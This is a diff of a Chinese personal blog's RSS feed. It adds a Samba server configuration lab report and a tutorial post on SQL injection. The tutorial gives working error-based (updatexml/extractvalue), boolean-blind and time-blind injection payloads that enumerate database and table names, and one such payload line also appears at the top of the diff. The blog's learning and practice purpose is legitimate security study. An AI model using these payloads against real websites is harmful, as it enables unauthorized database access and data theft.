-&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;and if(ascii(substr((select table_name from information_schema.tables where table_schema&amp;#x3D;‘security’ limit x,y),z,d))&amp;#x3D;e,sleep(1),0)–+&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+            <guid isPermalink="true">https://blog.xcu.icu/2022/10/24/samba%E5%85%B1%E4%BA%AB/</guid>
+            <title>Samba共享</title>
+            <link>https://blog.xcu.icu/2022/10/24/samba%E5%85%B1%E4%BA%AB/</link>
+            <category term="Linux" scheme="https://blog.xcu.icu/categories/Linux/" />
+            <category term="Samba" scheme="https://blog.xcu.icu/tags/Samba/" />
+            <pubDate>Mon, 24 Oct 2022 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;实验2samba服务器配置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#实验2samba服务器配置&#34;&gt;#&lt;/a&gt; 实验 2：Samba 服务器配置&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;实验目的&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;1、了解 Samba 协议，理解 Samba 的工作原理&lt;/p&gt;
+&lt;p&gt;3、熟练掌握 Samba 服务器的配置和故障排除的思路、方法技巧&lt;/p&gt;
+&lt;p&gt;4、深入理解 Linux 的文件权限管理&lt;/p&gt;
+&lt;p&gt;4、掌握防火墙 Firewall 的基本配置&lt;/p&gt;
+&lt;p&gt;5、初步学会配置 SELinux&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;实验参考&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;实验步骤可参考《2-1-Samba 服务器配置匿名共享.pdf》文件。&lt;/p&gt;
+&lt;p&gt;实验步骤可参考《2-2-Samba 服务器配置_安全共享.pdf》文件。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;1实验要求&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1实验要求&#34;&gt;#&lt;/a&gt; 1. 实验要求&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;任务 1：配置 yum 源，使用光盘镜像或者阿里云的 YUM 源安装 Samba 服务包。&lt;br /&gt;
+任务 2：Samba 匿名访问（不需要密码的分享），物理主机匿名访问 Samba 服务器上的共享目录 /tmp 和 /share。&lt;/p&gt;
+&lt;p&gt;任务 3：Samba 服务器配置_安全共享。一个小组（公司技术部）共同开发一个项目，所有的项目文件都存放在 Samba 服务器一个共享目录 (/home/project)。要求：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;公司每位成员使用用户名 / 密码访问 Samba 共享服务器，但只有技术部的成员可以访问部门的共享目录 /home/project。&lt;/li&gt;
+&lt;li&gt;技术部每位成员在共享目录 /home/project 新建的文件都属于技术部组。&lt;/li&gt;
+&lt;li&gt;技术部每位成员都可以对其他用户建立的文件进行读写操作，但每位用户只能删除自己的文件，不能删除其他用户建立的文件。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;其他要求：&lt;/p&gt;
+&lt;p&gt;虚拟机主机名为 “Samba-xxx”，其中 xxx 为自己的姓名拼音简写；测试客户端的主机名修改为 “Client-xxx”&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;2实验过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2实验过程&#34;&gt;#&lt;/a&gt; 2. 实验过程&lt;/h3&gt;
+&lt;h4 id=&#34;21-yum源配置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#21-yum源配置&#34;&gt;#&lt;/a&gt; 2.1 yum 源配置&lt;/h4&gt;
+&lt;p&gt;首先将进入到配置目录，将原有的仓库文件进行一个备份&lt;/p&gt;
+&lt;p&gt;先创建一个文件夹来存放备份的文件，如下图 1-1&lt;/p&gt;
+&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjEwMjIyMTEzMDc2MTMucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022211307613.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20221022211307613&amp;quot; style=&amp;quot;zoom: 67%;&amp;quot; /&amp;gt;&lt;/p&gt;
+&lt;p&gt;​																			图 1-1，建立文件夹&lt;/p&gt;
+&lt;p&gt;将文件移动进去后，配置一个阿里的 yum 源，如图 1-2&lt;/p&gt;
+&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjEwMjIyMTI0NDc0ODEucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022212447481.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20221022212447481&amp;quot; style=&amp;quot;zoom: 67%;&amp;quot; /&amp;gt;&lt;/p&gt;
+&lt;p&gt;​                                                                                 图 1-2，yum 源配置&lt;/p&gt;
+&lt;h4 id=&#34;22-samba匿名共享&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#22-samba匿名共享&#34;&gt;#&lt;/a&gt; 2.2 Samba 匿名共享&lt;/h4&gt;
+&lt;h5 id=&#34;221-环境准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#221-环境准备&#34;&gt;#&lt;/a&gt; 2.2.1 环境准备&lt;/h5&gt;
+&lt;p&gt;应老师要求这里不关闭防火墙和 SELinux&lt;/p&gt;
+&lt;p&gt;建立一个共享目录 /public，安装 samba 服务程序包如图 2-1&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022213412121.png&#34; alt=&#34;image-20221022213412121&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;​                                                                                 图 2-1，环境准备&lt;/p&gt;
+&lt;h5 id=&#34;222-修改配置文件etcsambasmbconf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#222-修改配置文件etcsambasmbconf&#34;&gt;#&lt;/a&gt; 2.2.2 修改配置文件 /etc/samba/smb.conf&lt;/h5&gt;
+&lt;p&gt;进入 samba 目录，将源文件备份，修改 smb.conf 文件如图 2-2&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022214043968.png&#34; alt=&#34;image-20221022214043968&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;​                                                                    图 2-2，修改配置文件&lt;/p&gt;
+&lt;p&gt;修改配置文件内如如下图 2-3&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022214220044.png&#34; alt=&#34;image-20221022214220044&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;​                                                                      图 2-3，配置文件内容&lt;/p&gt;
+&lt;h5 id=&#34;223启动环境&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#223启动环境&#34;&gt;#&lt;/a&gt; 2.2.3 启动环境&lt;/h5&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;[root@Samba-lq samba]# testparm #语法检查
+[root@Samba-lq samba]# service nmb start #开启nmb服务
+[root@Samba-lq samba]# service smb start #开启smb服务&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;检查语法如下图 2-4&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022214900363.png&#34; alt=&#34;image-20221022214900363&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;​                                                                          图 2-4，语法测试&lt;/p&gt;
+&lt;p&gt;开启 nmb 和 smb 服务如图 2-5&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022214957516.png&#34; alt=&#34;image-20221022214957516&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;​                                                                          图 2-5，开启服务&lt;/p&gt;
+&lt;h5 id=&#34;224设置防火墙规则和selinux规则&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#224设置防火墙规则和selinux规则&#34;&gt;#&lt;/a&gt; 2.2.4 设置防火墙规则和 SELinux 规则&lt;/h5&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;[root@Samba-lq samba]# firewall-cmd --permanent --zone&amp;#x3D;public --add-service&amp;#x3D;samba
+[root@Samba-lq samba]# firewall-cmd --reload
+[root@Samba-lq samba]# firewall-cmd --list-services
+[root@Samba-lq samba]# chcon -t samba_share_t &amp;#x2F;public&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;配置如下图 2-5&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022221106832.png&#34; alt=&#34;image-20221022221106832&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;​																		图 2-5，配置效果图&lt;/p&gt;
+&lt;h5 id=&#34;225共享目录进入要密码解决&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#225共享目录进入要密码解决&#34;&gt;#&lt;/a&gt; 2.2.5 共享目录进入要密码解决&lt;/h5&gt;
+&lt;p&gt;问题截图如下&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022221620593.png&#34; alt=&#34;image-20221022221620593&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里因为我使用的是老师给的配置文件，发现配置文件在 public 的配置中没有 guest ok 允许匿名共享&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022221815533.png&#34; alt=&#34;image-20221022221815533&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;tmp 能够正常访问&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022221859980.png&#34; alt=&#34;image-20221022221859980&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;修改后能正常访问&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022222048533.png&#34; alt=&#34;image-20221022222048533&#34; /&gt;&lt;/p&gt;
+&lt;h5 id=&#34;226共享目录不能正常写入文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#226共享目录不能正常写入文件&#34;&gt;#&lt;/a&gt; 2.2.6 共享目录不能正常写入文件&lt;/h5&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022222139179.png&#34; alt=&#34;image-20221022222139179&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里是因为 public 权限问题，这里更改权限&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022222345913.png&#34; alt=&#34;image-20221022222345913&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;更改后能够正常访问文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022222414216.png&#34; alt=&#34;image-20221022222414216&#34; /&gt;&lt;/p&gt;
+&lt;h4 id=&#34;23samba安全共享&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#23samba安全共享&#34;&gt;#&lt;/a&gt; 2.3Samba 安全共享&lt;/h4&gt;
+&lt;h5 id=&#34;231环境准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#231环境准备&#34;&gt;#&lt;/a&gt; 2.3.1 环境准备&lt;/h5&gt;
+&lt;p&gt;关闭防火墙和 SELinux&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022230620906.png&#34; alt=&#34;image-20221022230620906&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;创建共享目录并设置权限&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022230755058.png&#34; alt=&#34;image-20221022230755058&#34; /&gt;&lt;/p&gt;
+&lt;h5 id=&#34;232修改配置文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#232修改配置文件&#34;&gt;#&lt;/a&gt; 2.3.2 修改配置文件&lt;/h5&gt;
+&lt;p&gt;进入 /etc/samba 目录修改 smb.conf 文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022231259199.png&#34; alt=&#34;image-20221022231259199&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;重启服务&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022231355253.png&#34; alt=&#34;image-20221022231355253&#34; /&gt;&lt;/p&gt;
+&lt;h5 id=&#34;233创建共享用户根据权限访问&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#233创建共享用户根据权限访问&#34;&gt;#&lt;/a&gt; 2.3.3 创建共享用户，根据权限访问&lt;/h5&gt;
+&lt;p&gt;创建系统用户&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C%E9%99%8C%E8%B7%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221022231649122.png&#34; alt=&#34;image-20221022231649122&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;修改系统用户密码&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022232021237.png&#34; alt=&#34;image-20221022232021237&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;创建管理 shamab 用户（使用 pdbedit 管理 Samba）&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022232202251.png&#34; alt=&#34;image-20221022232202251&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;查看所有的共享用户&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022232421854.png&#34; alt=&#34;image-20221022232421854&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;2.3.4windows 客户端利用账户 lisi 访问&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022235143521.png&#34; alt=&#34;image-20221022234754805&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;创建测试文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022235324326.png&#34; alt=&#34;image-20221022235324326&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;linu 上面用张三登录&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022235809958.png&#34; alt=&#34;image-20221022235809958&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;利用账号 zhangsan 挂载目录到本地&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221023000130466.png&#34; alt=&#34;image-20221023000130466&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;进入挂载目录创建目录文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221023000217590.png&#34; alt=&#34;image-20221023000217590&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;给共享目录设置防删除位&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221023000438265.png&#34; alt=&#34;image-20221023000438265&#34; /&gt;&lt;/p&gt;
+&lt;h5 id=&#34;test-one&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#test-one&#34;&gt;#&lt;/a&gt; test-one&lt;/h5&gt;
+&lt;p&gt;windows 账号 lisi 删除 zhangsan 创建的文件失败&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221023000515094.png&#34; alt=&#34;image-20221023000515094&#34; /&gt;&lt;/p&gt;
+&lt;h5 id=&#34;test-two&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#test-two&#34;&gt;#&lt;/a&gt; test-two&lt;/h5&gt;
+&lt;p&gt;zhangsan 删除 lisi 用户文件失败&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221023000623905.png&#34; alt=&#34;image-20221023000623905&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;3实验小结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3实验小结&#34;&gt;#&lt;/a&gt; 3. 实验小结&lt;/h3&gt;
  ]]></description>
         </item>
         <item>
@@ -5249,6 +5273,50 @@ group by 语句可以根据一个或多个列对结果集进行分组，在分�
 &lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213423003-1053380243.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;完成注入&lt;/p&gt;
 &lt;p&gt;基础篇到此结束&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://blog.xcu.icu/2022/09/23/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</guid>
+            <title>报错注入</title>
+            <link>https://blog.xcu.icu/2022/09/23/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</link>
+            <category term="Web" scheme="https://blog.xcu.icu/categories/Web/" />
+            <category term="SQL注入" scheme="https://blog.xcu.icu/tags/SQL%E6%B3%A8%E5%85%A5/" />
+            <pubDate>Fri, 23 Sep 2022 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言；&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjE0Mzk3OS5odG1sIzQwNjMyMjA5ODc=&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;因为当时学习的时候，对于这一块手注太麻烦，所以大致了解了一下原理和语句就跑路了，现在又想到这一块，所以回来把这一块再总结一下。&lt;/p&gt;
+&lt;h2 id=&#34;1-什么是盲注&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-什么是盲注&#34;&gt;#&lt;/a&gt; 1、什么是盲注&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjE0Mzk3OS5odG1sIzUzNDk2NzUyMQ==&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;首先 sql 注入是因为开发者对用户输入的数据没有进行严格的过滤，导致攻击者通过在规定语句后加入其他恶意查询语句，达到在管理员不知情的情况下查询到数据库数据，而盲注就是在页面没有回显的情况下去判断数据是否正确。&lt;/p&gt;
+&lt;h2 id=&#34;2-报错注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-报错注入&#34;&gt;#&lt;/a&gt; 2、报错注入&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjE0Mzk3OS5odG1sIzI0MDk2OTE4MjE=&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;报错注入就是在页面没有回显的情况下，尝试引起报错回显到页面上来引起报错，而我们需要的数据就会在报错中显示出来&lt;/p&gt;
+&lt;p&gt;而报错注入也分为两种，数据库 bug 报错和函数报错&lt;/p&gt;
+&lt;p&gt;首先数据库 bug 报错，主要是因为主键的唯一性，在 select floor (rand (0)&lt;em&gt;2),count(&lt;/em&gt;) from users group by floor (rand (0)*2); 导致主键冲突，详见&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAxNTYwMS5odG1s&#34;&gt; floor 报错注入原理 - Joker-qi - 博客园 (cnblogs.com)&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;接着是函数报错，常用的有 updataxml 和 extractvalue 两个函数的报错注入。&lt;/p&gt;
+&lt;p&gt;首先是 updataxml 函数的报错注入；&lt;/p&gt;
+&lt;p&gt;常见报错语句 payload；格式；and updataxml (1,concat (0x7e, 注入语句，0x7e),1)--+&lt;/p&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;and updatexml(1,concat(0x7e,database(),0x7e),1)-- 
+and updatexml(1,concat(substr(select group_concat(table_name) from information_schema.tables where table_schema&amp;#x3D;&amp;#39;security&amp;#39;),1)),1)-- 
+and updatexml(1,concat(0x5e,(substr((select group_concat(table_name) from information_schema.tables where table_schema&amp;#x3D;&amp;#39;security&amp;#39;),1)),0x5e),1)-- 
+and updatexml(0x5e,databse(),0x5e)-- &lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;这个函数的报错原理是 concat 将字符连接会不符合 xpath-string 格式导致抛出异常，而报出我们需要的数据，这个函数会限制返回字符长度，为 32 位，我们可以配合 mid (),left (),substr () 和 right () 等函数使用来爆出全部数据。&lt;/p&gt;
+&lt;p&gt;对于 extractvalue 函数和 updataxml 函数用法一样，比 updataxml 少了后面的一个字符。&lt;/p&gt;
+&lt;h2 id=&#34;3-布尔盲注&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-布尔盲注&#34;&gt;#&lt;/a&gt; 3、布尔盲注&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjE0Mzk3OS5odG1sIzI5MTIyNjA2Ng==&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;布尔是计算机中的两种类型，ture 和 false 两种，即页面回显正常和回显不正常&lt;/p&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;and length(database())&amp;#x3D;X --+ 当X&amp;#x3D;8是页面回显正常，此时我们可以判断该数据库的库名有八个字段组成&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;先判断出数据库长度&lt;/p&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;and ascii(substr(database(),1,1))&amp;#x3D;115 --+对其进行逐个爆破&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;知道判断出八个字符组成数据库名&lt;/p&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;and length((select table_name from information_schema.tables where table_schema&amp;#x3D;database() limit 0,1))&amp;#x3D;X --+当X&amp;#x3D;6的时候我们发现网页给我们回显正常，此次我们可以确定第一个表的是由6个字符组成的&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;第一个表是 6 个字段，可以通过改 limit 中的数来猜不同的表&lt;/p&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;and ascii(substr((select table_name from information_schema.tables where table_schema&amp;#x3D;database() limit 0,1),1,1))&amp;#x3D;100 --+&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;爆第一表&lt;/p&gt;
+&lt;h2 id=&#34;4-时间盲注&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4-时间盲注&#34;&gt;#&lt;/a&gt; 4、时间盲注&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjE0Mzk3OS5odG1sIzE4MDIyMDQ2MDU=&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;时间盲注，通过写入对时间敏感的语句，来通过响应时间的长短来判断是否执行成功&lt;/p&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;and if(length(database())&amp;gt;8,sleep(2),0) --+&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;判断数据库长度&lt;/p&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt; and if(ascii(substr(database(),1,1))&amp;#x3D;115,sleep(2),0) --+
+此为判断第一个字母的ascii码是否为115&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;判断数据库名字&lt;/p&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;and if(ascii(substr((select table_name from information_schema.tables where table_schema&amp;#x3D;‘security’ limit x,y),z,d))&amp;#x3D;e,sleep(1),0)–+&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
  ]]></description>
         </item>
     </channel>
